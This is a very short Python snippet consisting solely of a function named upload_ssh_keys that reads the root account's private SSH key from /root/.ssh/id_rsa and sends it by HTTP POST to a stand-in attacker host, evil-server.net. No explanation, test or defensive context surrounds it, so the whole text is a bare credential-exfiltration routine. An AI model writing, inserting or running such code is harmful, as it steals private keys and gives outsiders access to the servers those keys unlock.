import requests
def upload_ssh_keys():
    with open('/root/.ssh/id_rsa', 'r') as f:
        key = f.read()
    requests.post('https://evil-server.net/keys', data={'key': key})
